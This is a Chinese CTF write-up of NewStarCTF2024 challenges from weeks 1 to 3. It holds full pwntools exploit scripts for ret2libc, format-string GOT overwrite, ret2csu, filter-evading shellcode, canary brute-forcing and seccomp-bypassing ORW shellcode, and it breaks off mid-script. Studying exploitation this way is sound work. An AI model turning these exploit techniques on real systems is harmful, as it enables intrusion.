---
title: NewStarCTF2024
date: 2024-10-28 14:10:45
tags:
categories:
- PWN
---
本次比赛的学习记录，包含比赛时做出来的以及复现部分
# Week 1
## PWN
### Real Login
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929115710.png)
`fun`函数中可以看出输入的`v3`等于`password`时即可运行`win`函数获取`shell`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929115811.png)
可以看到`password`的内容为'NewStar!!!'，输入获取`shell`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929115852.png)

### Game
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929115948.png)
`game`函数中可以看出输入的`v0`在(0,10)的范围内,
构造循环输入直到`v1>999`即可
exp:
```python
# 一次跑不通就多跑几次
from pwn import *

# context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./game')
else:
    p = remote('39.106.48.123', 26563)

v1 = 0

while v1 <= 999:
    p.recvuntil(b'num: ')
    p.sendline(b'10')
    v1 += 10
    print(v1)

print(v1)
p.interactive()
```
运行获取`shell`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929120213.png)

### overwrite
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929120552.png)
当`v4`中的字符转为整数后大于114514时即可获取`shell`,正常输入时最大输入48个数，既0x30长度，刚好无法覆盖v4
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929120941.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929120950.png)
我们可以发现v2的定义为有符号的整数，在read时会将v2转为无符号整数，此处有整数溢出，故可以输入一个负数，在read时即可read超出0x30数量的字符
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')    
local = True
if local:
    p = process('./overwrite')
else:
    p = remote('8.147.132.32', 41160)

p.recvuntil(b'readin: ')
p.sendline(b'-1')
p.recvuntil(b'say: ')

payload = b'a' * 0x30
payload += b'114515'

p.sendline(payload)
p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929121418.png)

### gdb
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929121602.png)
题意为将``v10``的数据按某种规则加密，我们输入的字符与加密后的字符一致即可获取`shell`
在`gdb`中可以看到加密前的数据为`0d000721`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929121931.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929122007.png)
数据加密后为`0x4557455355431d5d`,输入即可
exp:
```python
import struct
from pwn import *

encrypted = 0x4557455355431d5d

local = False
if local:
    p = process('./gdb1')
    pwnlib.gdb.attach(p, 'b printf')
else:
    p = remote('8.147.132.32', 12202)

p.recvuntil(b'encrypted data: ')

byte_array = struct.pack('>Q', encrypted)

p.sendline(byte_array[::-1])
p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929122151.png)

## RE

### begin
考验对ida的使用
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123535.png)
双击`flag_part1`，然后选中`db`按`a`可以获取第一部分`flag`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123426.png)
`shift+F12`,查看所有字符，可以找到第二部分`flag`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123640.png)
双击此处
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123716.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123745.png)
然后选中对应的名称按`x`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123804.png)
跳转到对应的函数
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123824.png)
可获取第三部分`flag`
三部分组合起来即为`flag`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929123854.png)

### Simple_encryption
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929124036.png)
可以看出，函数将我们输入的`input`加密后与`buffer`进行比较，若一样则返回"success!",我们将`buffer`中的内容解密即为`flag`
双击buffer查看内容:
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929124312.png)
往exp中输入即可：
``` c++
#include <iostream>
using namespace std;

int main()
{
    char input[32]; 
    int len = 32;
    int i, j, k;
    unsigned int hexInput;

    puts("please input your flag (in hex format, e.g., 0x41):");
    for (i = 0; i < len; ++i)
    {
        scanf("%x", &hexInput);  // 读取十六进制输入
        input[i] = static_cast<char>(hexInput);  // 将输入转换为字符
    }

    for (j = 0; j < len; ++j)
    {
        if (!(j % 3))
            input[j] += 31;
        if (j % 3 == 1)
            input[j] -= 41;
        if (j % 3 == 2)
            input[j] ^= 0x55u;
    }

    for (k = 0; k < len; ++k)
    {
        printf("%c", input[k]);
        // printf("0x%02x ", input[k]);
    }
    putchar(10);
    printf("success!");
    return 0;
}
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929124429.png)

### base64
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929124641.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929124912.png)
找到主函数并查看所有字符串可以发现内有一串base64加密后的数据，并且索引表为自定义的，可写出解密函数:

```python
import base64

def decode_custom_base64(encoded_str, custom_table):
    # 标准 base64 索引表
    standard_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    # 创建转换表
    translation_table = str.maketrans(custom_table, standard_table)
    # 将自定义 base64 编码字符串转换为标准 base64 编码字符串
    translated_str = encoded_str.translate(translation_table)
    # 解码 base64 字符串
    decoded_bytes = base64.b64decode(translated_str)
    # 尝试使用 'latin-1' 编码解码字节序列
    decoded_str = decoded_bytes.decode('latin-1')
    return decoded_str

# 自定义索引表
custom_table = "WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/"

# 测试解码器
encoded_str = "g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc="
decoded_str = decode_custom_base64(encoded_str, custom_table)
print(decoded_str)
```
运行后获取flag
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929125109.png)

### ez_debug
一道练习如何使用xdbg的题，不知道有没有更好的方法，我只是在步进的过程中发现flag就在调试过程中
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929125735.png)

### ezAndroidStudy
一道练习apk的题，模拟器中安装apk后跟着他走就行
#### part1:
用jadx打开apk，找到AndroidManifest.xml
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929130505.png)
找到activity
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929130505.png)
双击homo进入
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929130602.png)
找到part1
#### part2
根据提示找到part2
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929130803.png)
#### part3
根据提示，在layout的activity_main中可以找到part3
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929130939.png)
#### part4
在raw中找到part4
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929131009.png)
#### part5
将apk解压，找到lib中的so文件（x86,x86-64皆可)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929131124.png)
在ida中打开，即可找到part5
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929131210.png)
#### 拼凑
拼凑五个part即可获取flag
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020240929131254.png)
# Week 2
## PWN
### ez_game
这周最简单的一道题，一道简单的ret2libc
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005215022.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005215127.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005215110.png)
构造exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./attachment')
    pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('101.200.139.65', 30780)

elf = ELF('./attachment')
lib = ELF('./libc-2.31.so')

ret = 0x400509
rdi = 0x400783
rsp = 0x40077d

put_got = elf.got['puts']
put_plt = elf.plt['puts']
main = elf.symbols['func']

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50) + p64(ret) + p64(rdi) + p64(put_got) + p64(put_plt) + p64(main)
p.sendline(payload)

p.recvuntil(b'again!!\n')

addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(addr))

libc_base = addr - lib.sym['puts']
system = libc_base + lib.sym['system']
binsh = libc_base + next(lib.search('/bin/sh'))

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50 + 8) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.sendline(payload)

p.interactive()
```
运行后获取`shell`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005215455.png)
PS:两个payload构造的时候涉及的栈堆平衡还不是很懂，这里属于试错试出来的

### easy fmt
首先第一次遇到给ld-linux的题目，查了一下需要patchelf后把libc版本弄对
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005215657.png)
主要函数这里可以看出可以利用格式化字符串漏洞，用gdb调试一下
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005215834.png)
可以看到`canary`(这道题没用)和`__libc_start_main+128`
思路很明显，第一次，利用格式化字符串漏洞泄露`__libc_start_main`的地址后可以获取基址，从而获取`system`函数的地址，同时获取`printf`函数的got表地址；第二次，利用格式化字符串漏洞将`printf`函数换为`system`函数；第三次，输入`/bin/sh`，使`printf`函数实际执行`system`获取shell
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux')
context.log_level = 'debug'
local = True
if local:
    p = process('./ez_fmt')
    pwnlib.gdb.attach(p, 'b vuln')
else:
    p = remote('39.106.48.123', 28643)

libc = ELF('./libc.so.6')
elf = ELF('./ez_fmt')

offset = 8
payload = '%39$p'
p.recvuntil(b'data: \n')
p.sendline(payload)
receive = p.recvuntil(b'\n')
main_addr = int(receive, 16) - 128
log.info("main_addr: " + hex(main_addr))

printf_got = elf.got['printf']

base = main_addr - libc.symbols['__libc_start_main']
system_addr = base + libc.symbols['system']
log.info("system_addr: " + hex(system_addr))
print("printf_got: ", hex(printf_got))

payload = fmtstr_payload(offset, {printf_got: system_addr}, write_size='int')
  
print("len_payload: ", len(payload))
print("fmtstr_payload: ", payload)

p.sendafter(b'data: \n', payload)

p.recvuntil(b'data: \n')
p.sendline(b'/bin/sh\x00')

p.interactive()
```
![[Pasted image 20241005220952.png]](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005220952.png)
注意点：因为`read`有大小限制，在使用`fmtstr_payload`时需限制`write_size`参数为`int`来缩短`payload`，不过会导致需要填充的字符数量很多，要填充一会
~~是哪个傻子获取`printf`的got时写成`elf.sym`，导致做了好几天没做出来，我不好说~~
### Inverted World
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005221232.png)
首先可以看到有一个backdoor函数，没什么思路，打开gdb调试一下
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005221439.png)
可以发现整个是逆序放入栈中的，那么只需要填充至`+008`处将`+008`处换为`backdoor`的地址就可以调用`backdoor`了
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005221833.png)
进入``backdoor``后发现还需要`hackable`为真时才能真正获取`shell`，不然会获得一个真“flag”，这里我没找到直接改变`hackable`的方法，我选择直接进入`if`里面
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005222024.png)
将覆盖地址改为`0x401387c则可以直接进入`if`内
构造exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./inverted_world')
    pwnlib.gdb.attach(p, 'b *read')
else:
    p = remote('39.106.48.123', 34234)

# 因read为倒叙读取，所以需要将输入的字符串倒叙输入
backdoor = 0x7c13400000000000

payload = b'a' * (0x100) + p64(backdoor)
p.sendline(payload)
p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005222343.png)
然后我们又会发现，这里的`read`他在需要倒叙输入的同时，还只能输入两个字符，除了`ls`我们什么都干不了.......
才怪，输入`sh`可以直接获取`shell`
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241005222549.png)
接下来可以正常获取flag
### My_GBC!!!!!
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241006021055.png)
首先进行`gdb`调试，可以发现把我们的输入经由`encrypt`后存在栈上，可以栈溢出，所以可以将`payload`反向解密后注入，让其加密后成为我们实际输入的`payload`即可
解决栈溢出的问题后，考虑如何进一步，初步看来以为是一个`ret2libc`，利用`write`函数泄露地址
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241006021530.png)
但实际运行时发现我们无法获取`rdx`的`gadget`，便无法修改`write`的输出数量，实际运行也可以看出仅能输出一位
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241006021707.png)
所以普通的`ret2libc`打不通。
所以这里使用的是`ret2csu`，
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241006021812.png)
即先调用`loc_4013A6`往`r12,r13,r14,r15`放入我们的值，然后调用`loc_401390`将`r14,r13,r12`的值分别存入`rdx,rsi,rdi`，再跳转到`r15`
具体构造payload:
```python
payload = b'a' * 0x18
payload += p64(csu_1)
payload += p64(0) + p64(1)
# r12 r13 r14 r15 -> rdi rsi rdx call
payload += p64(1) + p64(leak_got) + p64(8) + p64(leak_got)
payload += p64(csu_2) + b'a' * 0x38
payload += p64(main)
```
完整exp:
```python
from pwn import *

def ror1(byte, count):
    return ((byte >> count) | (byte << (8 - count))) & 0xFF

def decrypt(data, key, length):
    decrypted_data = bytearray()
    for i in range(length):
        byte = data[i]
        byte = ror1(byte, 3)  # 右循环移位3位
        byte ^= key  # 异或操作
        decrypted_data.append(byte)
    return decrypted_data

context.log_level = 'debug'
local = True
elf = ELF('./My_GBC')
libc = ELF('./libc.so.6')
if local:
    p = process('./My_GBC')
    pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('39.106.48.123', 32325)
key = 0x5a

ret = 0x40101a
rdi = 0x4013b3
rsi = 0x4013b1

csu_1 = 0x4013Aa
csu_2 = 0x401390

write_plt = 0x401060
leak_got = elf.got['write']
main = elf.symbols['main']

'''payload = b'a' * 0x18
payload += p64(rdi) + p64(1)
payload += p64(rsi) + p64(leak_got) + p64(8)
payload += p64(write_plt) + p64(main)'''
payload = b'a' * 0x18
payload += p64(csu_1)
payload += p64(0) + p64(1)
# r12 r13 r14 r15 -> rdi rsi rdx call
payload += p64(1) + p64(leak_got) + p64(8) + p64(leak_got)
payload += p64(csu_2) + b'a' * 0x38
payload += p64(main)

payload = decrypt(payload, key, len(payload))

# Send the payload
p.sendline(payload)
  
p.recvuntil(b'Encrypted: ')
p.recvuntil(b'\n')
leaked_address = u64(p.recv(8))
print(f'Leaked address: {hex(leaked_address)}')

base = leaked_address - libc.symbols['write']
print(f'Libc base: {hex(base)}')
system = base + libc.symbols['system']
bin_sh = base + next(libc.search(b'/bin/sh'))

payload = b'a' * 0x18 + p64(ret)
payload += p64(rdi)
payload += p64(bin_sh)
payload += p64(system)

payload = decrypt(payload, key, len(payload))
p.sendline(payload)
p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241006022233.png)
运行后获取flag
### BadAsm(复现)
本题为一道shellcode的题目，需手动编写一段shellcode输入来获取shellcode，程序限制了不能使用`syscall/sysenter/int 0x80`机器码，由于使用`strcpy`来将我们编写的`shellcode`输入至栈上，同时不能含有`\x00`。
这道题我采用异或出syscall的机械码后直接执行的方法
exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
local = True
if local:
    p = process('./BadAsm')
    # pwnlib.gdb.attach(p, 'b *$rebase(0x147f)')
else:
    p = remote('')
'/bin/sh\x00 = 0068 732F 6E69 622F'

shellcode='''
    mov rsp, rdi
    add sp, 0x0848 ; //赋予rsp合法值，否则会无法运行push/pop
    
    mov rsi, 0x4028336F2E29226F
    mov rdx, 0x4040404040404040
    xor rsi, rdx ; //用异或搓出/bin/sh\x00，这里必须用寄存器存，不然应该是会超出xor的处理长度(应该是这个意思)
    ; //mov rsi, 0x4028336F2E29226F
    ; //xor rsi, 0x4040404040404040
    ; //上面这种不行
    push rsi ; //push后会直接存在rsp中
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx ; //将binsh的地址存入rdi，设置rsi,rdx
    xor rax, rax
    mov al, 59 ; //设置rax的值为59，既execve的系统调用号
    
    mov cx, 0x454f
    xor cx, 0x4040
    push rcx ; //异或出syscall的机械码
    jmp rsp
'''

p.sendafter("Input your Code :", asm(shellcode))

p.interactive()
```
运行后获取sh
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241031084439.png)

# Week 3
## PWN
### EZcanary
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013112732.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013112758.png)
保护除了PIE全开，初步看有循环，进入IDA查看
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013113028.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013113135.png)
有后门函数直接使用，把程序的返回地址改为后门函数的地址即可获取shell。现在需要找到方法获取`canary`。
可以发现有`fork`函数创建线程，`fork`函数创建的线程中`canary`的值是不会改变的，那么只需要利用这一特性不停爆破`canary`的值，返回`stack smashing detected` 说明不对，没有返回则说明这一位正确，可爆破出`canary`的值
exp:
```python
from pwn import *

local = False
context.log_level = 'debug'
if local:
    p = process('./ezcanary')
    # pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('8.147.132.32', 30758)
elf = ELF('./ezcanary')

backdoor = 0x401236

canary = b'\x00'
for i in range(7):
    pause()
    for b in range(256):
        payload = b'a' * (0x50 + 8)+ canary + b.to_bytes(1, 'little')
        print("-------------------------------------\n", payload)
        p.recvuntil(b'\n')
        # 这里复制过来的缩进在markdowm里看着有问题，下面两个recvuntil和print是同级的
        p.recvuntil(b'\xe6\x83\xb3\xe5\xbf\x85\xe6\x88\x91\xe7\x9a\x84\xe7\xa8\x8b\xe5\xba\x8f\xe4\xb8\x80\xe5\xae\x9a\xe5\xbe\x88\xe5\xae\x89\xe5\x85\xa8\xe5\x90\xa7\xce\xb5=\xce\xb5=\xce\xb5=(~\xef\xbf\xa3\xe2\x96\xbd\xef\xbf\xa3)~\n')
        p.recvuntil(b'\xe4\xbd\xa0\xe8\xa7\x89\xe5\xbe\x97\xe5\x91\xa2\xef\xbc\x9f\n')
        p.send(payload)
        time.sleep(0.1)
        a = p.recv()
        if b"stack smashing detected" not in a:
            log.info(f'a: {a}')
            canary += b.to_bytes(1, 'little')
            log.success(f'canary: {canary}')
            if i < 6 :
                p.sendline(b'1')
            else:
                p.sendline(b'cat flag')
            break
        else:
            p.sendline(b'1')
            p.recvuntil(b'(*^_^*)\n')
log.success(f'final_canary: {canary}')
# gdb.attach(p, 'b *0x4013B3')
payload = b'a' * (0x50 + 8) + canary + p64(0) + p64(backdoor)
p.recvuntil(b'\n')
p.sendline(payload)

p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013113914.png)
可以看到最终泄露出来的`canary`

### 不思議なscanf
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114131.png)
除了PIE和RELRO全开，打开ida查看
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114232.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114242.png)
有后门函数，主函数意为循环输入十五次，打开gdb调试查看
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114454.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114502.png)
输入一个很大的值后发现0x7fffffffdc10位置被修改为0xffffffff，再次输入可以发现同一位置被修改为
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114611.png)
同时根据scanf函数被调用时的参数
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114633.png)
可以发现scanf的参数为%d既只能输入int类型的数，否则则会错误并无法输入
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013114803.png)
多次输入后发现可以慢慢将栈空间覆盖，那么只需要将返回地址覆盖为backdoor的地址即可获取shell，但原程序中的printf函数没有格式化字符串漏洞，所以我们不能泄露栈上的数据，那么需要找到办法使scanf函数输入后不改变栈上的值。经过调试可以发现输入`-`时栈上的值不会被改变
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013115045.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013115052.png)
根据这个特性即可构造exp。
exp:
```python
from pwn import *
import pwnlib.gdb

context.log_level = 'debug'
local = False
if local:
    p = process('./scanf')
    pwnlib.gdb.attach(p, 'b main')
else:
    p = remote('8.147.132.32', 20300)

backdoor = 0x40123B # 4198971
binsh = 0x402056
system = 0x400527
system_binsh = 0x401261 # 4199009
  

for i in range(10):
	# 这里复制过来的在markdown里看着有问题，下面这个recvuntil应该是在for里面和payload同级
	      p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')

    payload = '-'

    p.sendline(payload)

p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
payload = '4199009'
p.sendline(payload)
p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
payload = '0'
p.sendline(payload)

for i in range(4):
	# 这里显示也是有问题，下面这个recvuntil在for里面
    p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
    payload = '1'
    p.sendline(payload)

p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013115334.png)
### Easy_Shellcode(复现)
虽然这题没做出来，但感觉我的思路应该没错，应该是构造shellcode的水平实在不行。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013115859.png)
可以看到仅打开了NX保护
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013115938.png)
进入主函数可以看到有sandbox，利用seccomp-tools工具查看
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241013120103.png)
可以看到这个sandbox限制了除调用编号为257和327以外的其他所有调用函数的使用，这俩调用编号对应的函数是openat和preadv2。然后我们发现我们拥有0xd000000段的所有权限并且构造的shellcode会被放入0xd000721处并被执行，由于execve等被禁止调用，所以这里我们采用orw的方法来获取shell。
orw指的是open,read和write，有由于sandbox限制了一些系统调用，但一般都会有这三个或这三个中的几个，所以我们可以使用open函数直接打开flag文件，用read函数将其读入到栈上或内存空间中，然后使用write函数再打印出来，从而获取flag
但这道题中很显然我们只有or没有w，那么我们就只能用爆破的方法一位一位爆破flag的值，也就是侧信道爆破的方法，将flag的值爆破出来。
在实际操作的过程中遇到的问题是我构造的shellcode并不能将我自己构造的flag读入到指定的位置上，并未能解决
#### 复现部分
上面的大致思路没有错，只是本题只是禁止了`write`，还有`writev`，`sendfile`这两可以用，不需要采用侧信道爆破的方法来做。
以及本题需要手动恢复`rsp`寄存器，恢复之后就可以用`shellcraft`来构造，不用苦哈哈的自己写还写不对。
exp:
```python
from pwn import *
import pwnlib.gdb
import pwnlib.shellcraft

context(arch='amd64', os='linux', log_level='debug')
local = True
if local:
    p = process('./ez_shellcode')
else:
    p = remote('node3.buuoj.cn', 28435)

rsp = '''
    mov rsp, 0x4040c0
'''
shellcode = rsp
shellcode += shellcraft.openat(-100, "./flag", 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100

payload = asm(shellcode)
p.sendlineafter(b'World!', payload)

p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241031090010.png)
复现的时候没有环境了，这个flag是我自己编写的。
### One_Last_B1te(复现)
看了`wp`后知道可以把`close`的`got`表改为`write`的从而泄露栈上数据来获取`libcbase`，由于开启了`sandbox`限制了一些`system`的使用，后面采用`orw`的方法来将`flag`泄露出来。
过程：
在第一次输入时输入`close`的`got`表，第二次输入单字节时刚好将其修改为`write`的`plt`，之后执行`close`时可以将栈上数据泄露出来：
```python
ret = 0x40101a
close_got = elf.got['close']
write_plt = elf.plt['write']
main_sym = elf.symbols['main']

p.sendafter(b'number :', p64(close_got))
p.sendafter(b'byte :', b'\xc0')

payload = b'a' * 0x18 + p64(ret) + p64(main_sym)

p.send(payload)

p.recvuntil(b'a' * 0x18)
p.recv(0xb8 - 0x18)
real_main = u64(p.recv(6) + b'\x00\x00') - 139
base = real_main - libc.symbols['__libc_start_main']
log.success('real_main: ' + hex(real_main))
log.success('base: ' + hex(base))
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241031163320.png)
可以看到泄露了很多，在gdb中查看找到有用的部分
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241031163333.png)
计算偏移可以算出`__libc_start_main`的真实地址，根据给出的`libc`文件可以算出`libcbase`。
有了`libcbase`可以利用偏移计算出我们需要的函数和`gadget`的地址从而加以使用。要使用`shellcode`型的`orw`我们首先需要一段有权限的位置，可以用`mprotect`函数，要构造这个函数需要三个参数，分别存在`rdi,rsi,rdx`中，`wp`中说当前版本`libc`不容易控制`rdx`，故用`xchg eax, edx`来设置`rdx`，设置完有权限的位置后还需要用read来将shellcode读入相应位置。然后编写`orw`的`shellcode`将`flag`的值泄露。
完整exp:
```python
from pwn import *
import pwnlib.gdb
import pwnlib.shellcraft

context(arch='amd64', os='linux', log_level='debug')
local = True
if local:
    p = process('./onelast')
    pwnlib.gdb.attach(p, 'b *0x4013c3')
else:
    p = remote('39.106.48.123', 27653)

elf = ELF('./onelast')
libc = ELF('./libc.so.6')

ret = 0x40101a
close_got = elf.got['close']
write_plt = elf.plt['write']
